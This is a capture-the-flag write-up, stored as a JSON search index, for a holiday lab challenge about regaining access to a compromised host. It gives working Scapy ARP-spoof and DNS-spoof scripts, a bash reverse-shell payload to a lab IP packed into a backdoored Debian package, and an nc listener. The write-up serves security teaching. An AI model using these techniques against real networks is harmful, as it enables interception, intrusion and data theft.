wait for the reverse shell from the compromised host. Once we see the connect to ... message from nc , we know the reverse shell was successful: We can use the same copy/paste method to transfer the /NORTH_POLE_Land_Use_Board_Meeting_Minutes.txt file out of the terminal and to our local machine: And do the reverse on our local machine: base64 -d | gunzip > NORTH_POLE_Land_Use_Board_Meeting_Minutes.txt . Reading the relatively mundane meeting minutes from the North Pole Land Use board, we see that Tanta Kringle recused herself from voting on the Kringle Castle expansion plans. Answer # Tanta Kringle","title":"ARP Shenanigans"},{"location":"objectives/9/#arp-shenanigans","text":"","title":"ARP Shenanigans"},{"location":"objectives/9/#objective","text":"Go to the NetWars room on the roof and help Alabaster Snowball get access back to a host using ARP . Retrieve the document at /NORTH_POLE_Land_Use_Board_Meeting_Minutes.txt . Who recused herself from the vote described on the document? Difficulty: 4/5","title":"Objective"},{"location":"objectives/9/#alabaster-snowballs-dialog","text":"Those skills might be useful to you later on! I've been trying those skills out myself on this other terminal. I'm pretty sure I can use tcpdump to sniff some packets. Then I'm going to try a machine-in-the-middle attack. Next, I'll spoof a DNS response to point the host to my terminal. Then I want to respond to its HTTP request with something I'll cook up. I'm almost there, but I can't quite get it. I could use some help! Oh, I see the Scapy Present Packet Prepper has already been completed! Now you can help me get access to this machine. It seems that some interloper here at the North Pole has taken control of the host. We need to regain access to some important documents associated with Kringle Castle. Maybe we should try a machine-in-the-middle attack? That could give us access to manipulate DNS responses. But we'll still need to cook up something to change the HTTP response. I'm sure glad you're here Santa.","title":"Alabaster Snowball's dialog:"},{"location":"objectives/9/#hints","text":"Jack Frost must have gotten malware on our host at 10.6.6.35 because we can no longer access it. Try sniffing the eth0 interface using tcpdump -nni eth0 to see if you can view any traffic from that host. The host is performing an ARP request. Perhaps we could do a spoof to perform a machine-in-the-middle attack. I think we have some sample scapy traffic scripts that could help you in /home/guest/scripts . Hmmm, looks like the host does a DNS request after you successfully do an ARP spoof. Let's return a DNS response resolving the request to our IP . The malware on the host does an HTTP request for a .deb package. Maybe we can get command line access by sending it a command in a customized .deb file","title":"Hints"},{"location":"objectives/9/#solution","text":"Note Complete the terminal Scapy Prepper for hints on how to solve this objective. From the hints, we find out a host on the Castle's network has been compromised. We also learn that there will be a multi-step process to gain access to the host: Respond to the ARP request from the compromised host. Respond to the DNS request from the compromised host. Provide a package file to the compromised host with a backdoor script. Gain shell access to the host and retrieve the document.","title":"Solution"},{"location":"objectives/9/#arp-response","text":"The compromised host is requesting the MAC address of 10.6.6.53 . We have a template scapy script in scripts/arp_resp.py , but some of the fields in the response need to be filled out: ether_resp = Ether ( dst = \"SOMEMACHERE\" , type = 0x806 , src = \"SOMEMACHERE\" ) arp_response = ARP ( pdst = \"SOMEMACHERE\" ) arp_response . op = 99999 arp_response . plen = 99999 arp_response . hwlen = 99999 arp_response . ptype = 99999 arp_response . hwtype = 99999 arp_response . hwsrc = \"SOMEVALUEHERE\" arp_response . psrc = \"SOMEVALUEHERE\" arp_response . hwdst = \"SOMEVALUEHERE\" arp_response . pdst = \"SOMEVALUEHERE\" We need to respond to the ARP request and tell the compromised host to direct any subsequent traffic to us. Using this guide to ARP packets , we can fill in the appropriate sections in the response packets: ether_resp = Ether ( dst = packet [ Ether ] . src , type = 0x806 , src = macaddr ) arp_response = ARP ( pdst = packet [ ARP ] . psrc ) arp_response . op = \"is-at\" arp_response . plen = packet [ ARP ] . plen arp_response . hwlen = packet [ ARP ] . hwlen arp_response . ptype = packet [ ARP ] . ptype arp_response . hwtype = packet [ ARP ] . hwtype arp_response . hwsrc = macaddr arp_response . psrc = packet [ ARP ] . pdst arp_response . hwdst = packet [ Ether ] . src arp_response . pdst = packet [ ARP ] . psrc And we were successful: We can see the next piece of data we need to spoof: a DNS lookup for ftp.osuosl.org . There's a sample script in scripts/dns_resp.py , with some sections we need to change: # destination ip we arp spoofed ipaddr_we_arp_spoofed = \"10.6.1.10\" def handle_dns_request ( packet ): # Need to change mac addresses, Ip Addresses, and ports below. # We also need eth = Ether ( src = \"00:00:00:00:00:00\" , dst = \"00:00:00:00:00:00\" ) # need to replace mac addresses ip = IP ( dst = \"0.0.0.0\" , src = \"0.0.0.0\" ) # need to replace IP addresses udp = UDP ( dport = 99999 , sport = 99999 ) # need to replace ports dns = DNS ( # MISSING DNS RESPONSE LAYER VALUES ) DNS packets are complex to create, and can be tricky to get right. A couple of helpful guides are at here and here . With much trial and error, we can build a response packet with the following code: # destination ip we arp spoofed ipaddr_we_arp_spoofed = \"10.6.6.53\" def handle_dns_request ( packet ): # Need to change mac addresses, Ip Addresses, and ports below. # We also need eth = Ether ( src = packet [ Ether ] . dst , dst = packet [ Ether ] . src ) ip = IP ( dst = packet [ IP ] . src , src = packet [ IP ] . dst ) udp = UDP ( dport = packet [ UDP ] . sport , sport = packet [ UDP ] . dport ) dns = DNS ( id = packet [ DNS ] . id , qr = 1 , ra = 1 , rd = 1 , opcode = \"QUERY\" , rcode = \"ok\" , qdcount = 1 , ancount = 1 , qd = packet [ DNS ] . qd , an = DNSRR ( rrname = packet [ DNS ] . qd . qname , type = 'A' , rclass = 'IN' , ttl = 82159 , rdata = ipaddr ), ) A small shell script helps manage starting the spoof scripts. The DNS spoof script is started first, to be ready when the ARP spoof fires: #!/bin/sh python3 dns_resp.py & python3 arp_resp.py & We can see the ARP request & response, then the DNS query and response: Now we see a new request from the compromised host: an attempted HTTP request, which failed as there was no web server listening on port 80 : We can start one with python3 -m http.server 80 , run our shell script again, and look at the web server output to see what the compromised host is requesting: The compromised host is requesting a Debian package /pub/jfrost/backdoor/suriv_amd64.deb . We can create a package with a backdoor in it, serve it up with the correct path, and receive a remote shell when the compromised host installs the package. There are a number of Debian packages in the debs directory in the terminal, but I found it easier to use a tool to create an empty package with just a reverse shell backdoor instead of modifying one of the provided ones. The tool I used is Derbie . After cloning the GitHub repository on your local machine and installing the dependencies, create a smiple reverse shell payload script: #!/bin/bash 0 < & 196 ; exec 196 <>/dev/tcp/10.6.0.3/10444 ; sh < & 196 > & 196 2 > & 196 Replace 10.6.0.3 with the IP address of the host in your terminal. Next, generate the package with python3 Derbie.py suriv payload.sh : We now need to get the package from our local machine into the ARP Spoof terminal. As the terminal can't reach outside it's network, the best method of transferring the package is copy/paste. On the local machine run base64 debs/suriv_43_all.deb , copy the base64-encoded text, and in the terminal run base64 -d > suriv_amd64.deb , then paste the text. For the HTTP GET request to work, we need to make sure we have the correct path set up. Run mkdir -p pub/jfrost/backdoor/ , move the package file to that directory, then re-start the Python HTTP server. Finally, add a listener to the shell script: #!/bin/sh python3 dns_resp.py & python3 arp_resp.py & nc -vnlp 10444 Run the script, and wait for the reverse shell from the compromised host. Once we see the connect to ... message from nc , we know the reverse shell was successful: We can use the same copy/paste method to transfer the /NORTH_POLE_Land_Use_Board_Meeting_Minutes.txt file out of the terminal and to our local machine: And do the reverse on our local machine: base64 -d | gunzip > NORTH_POLE_Land_Use_Board_Meeting_Minutes.txt . Reading the relatively mundane meeting minutes from the North Pole Land Use board, we see that Tanta Kringle recused herself from voting on the Kringle Castle expansion plans.","title":"ARP response"},{"location":"objectives/9/#answer","text":"Tanta Kringle","title":"Answer"}]}